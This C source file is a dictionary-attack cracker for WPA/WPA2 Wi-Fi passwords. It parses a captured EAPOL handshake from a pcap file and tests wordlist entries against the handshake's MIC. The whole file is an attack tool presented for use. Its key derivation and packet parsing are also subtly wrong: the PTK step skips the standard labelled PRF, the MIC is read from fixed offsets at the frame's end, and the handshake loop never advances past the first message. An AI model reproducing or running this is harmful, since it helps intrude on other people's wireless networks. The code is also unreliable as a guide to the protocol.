#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <pcap.h>
#include <openssl/hmac.h>
#include <openssl/evp.h>
#include <openssl/sha.h>

// Constants
#define EAPOL_TYPE 0x888E
#define MIC_LENGTH 16
#define PMK_LENGTH 32
#define ANONCE_LENGTH 32
#define SNONCE_LENGTH 32
#define MAC_ADDR_LENGTH 6

typedef struct {
    uint8_t ap_mac[MAC_ADDR_LENGTH];
    uint8_t client_mac[MAC_ADDR_LENGTH];
    uint8_t anonce[ANONCE_LENGTH];
    uint8_t snonce[SNONCE_LENGTH];
    uint8_t mic[MIC_LENGTH];
    uint8_t *eapol_frame;
    size_t eapol_len;
} HandshakeData;

uint8_t *derive_pmk(const char *ssid, const char *password) {
    static uint8_t pmk[PMK_LENGTH];
    PKCS5_PBKDF2_HMAC(password, strlen(password), (unsigned char *)ssid, strlen(ssid), 4096, EVP_sha1(), PMK_LENGTH, pmk);
    return pmk;
}

uint8_t *derive_ptk(uint8_t *pmk, uint8_t *anonce, uint8_t *snonce, uint8_t *ap_mac, uint8_t *client_mac) {
    static uint8_t ptk[PMK_LENGTH];
    uint8_t data[2 * MAC_ADDR_LENGTH + ANONCE_LENGTH + SNONCE_LENGTH];

    memcpy(data, ap_mac, MAC_ADDR_LENGTH);
    memcpy(data + MAC_ADDR_LENGTH, client_mac, MAC_ADDR_LENGTH);
    memcpy(data + 2 * MAC_ADDR_LENGTH, anonce, ANONCE_LENGTH);
    memcpy(data + 2 * MAC_ADDR_LENGTH + ANONCE_LENGTH, snonce, SNONCE_LENGTH);

    HMAC(EVP_sha1(), pmk, PMK_LENGTH, data, sizeof(data), ptk, NULL);
    return ptk;
}

int validate_mic(uint8_t *ptk, uint8_t *mic, uint8_t *eapol_frame, size_t eapol_len) {
    uint8_t calculated_mic[MIC_LENGTH];
    uint8_t eapol_copy[eapol_len];

    memcpy(eapol_copy, eapol_frame, eapol_len);
    memset(eapol_copy + eapol_len - MIC_LENGTH, 0, MIC_LENGTH);

    HMAC(EVP_sha1(), ptk, PMK_LENGTH, eapol_copy, eapol_len, calculated_mic, NULL);
    return memcmp(calculated_mic, mic, MIC_LENGTH) == 0;
}

int extract_handshake(const char *pcap_file, HandshakeData *handshake) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_offline(pcap_file, errbuf);
    if (!handle) {
        fprintf(stderr, "[-] Error reading PCAP file: %s\n", errbuf);
        return 0;
    }

    struct pcap_pkthdr *header;
    const uint8_t *packet;
    int handshake_complete = 0;

    while (pcap_next_ex(handle, &header, &packet) > 0) {
        if (ntohs(*(uint16_t *)(packet + 12)) == EAPOL_TYPE) {
            if (!handshake->eapol_frame) {
                memcpy(handshake->ap_mac, packet + 6, MAC_ADDR_LENGTH);
                memcpy(handshake->client_mac, packet, MAC_ADDR_LENGTH);
                memcpy(handshake->anonce, packet + 26, ANONCE_LENGTH);
            } else {
                memcpy(handshake->snonce, packet + 26, SNONCE_LENGTH);
                memcpy(handshake->mic, packet + header->caplen - MIC_LENGTH, MIC_LENGTH);

                handshake->eapol_len = header->caplen;
                handshake->eapol_frame = malloc(handshake->eapol_len);
                memcpy(handshake->eapol_frame, packet, handshake->eapol_len);

                handshake_complete = 1;
                break;
            }
        }
    }

    pcap_close(handle);
    return handshake_complete;
}

void crack_password(const char *pcap_file, const char *wordlist, const char *ssid) {
    HandshakeData handshake = {0};
    if (!extract_handshake(pcap_file, &handshake)) {
        fprintf(stderr, "[-] Handshake extraction failed.\n");
        return;
    }

    printf("[*] Handshake successfully extracted.\n");
    printf("    AP MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", handshake.ap_mac[0], handshake.ap_mac[1],
           handshake.ap_mac[2], handshake.ap_mac[3], handshake.ap_mac[4], handshake.ap_mac[5]);
    printf("    Client MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", handshake.client_mac[0], handshake.client_mac[1],
           handshake.client_mac[2], handshake.client_mac[3], handshake.client_mac[4], handshake.client_mac[5]);

    FILE *file = fopen(wordlist, "r");
    if (!file) {
        fprintf(stderr, "[-] Error opening wordlist.\n");
        return;
    }

    char password[256];
    while (fgets(password, sizeof(password), file)) {
        password[strcspn(password, "\n")] = '\0';
        uint8_t *pmk = derive_pmk(ssid, password);
        uint8_t *ptk = derive_ptk(pmk, handshake.anonce, handshake.snonce, handshake.ap_mac, handshake.client_mac);

        if (validate_mic(ptk, handshake.mic, handshake.eapol_frame, handshake.eapol_len)) {
            printf("[+] Password found: %s\n", password);
            free(handshake.eapol_frame);
            fclose(file);
            return;
        }
    }

    printf("[-] Password not found in the provided wordlist.\n");
    free(handshake.eapol_frame);
    fclose(file);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <pcap file> <wordlist> <SSID>\n", argv[0]);
        return 1;
    }

    crack_password(argv[1], argv[2], argv[3]);
    return 0;
}
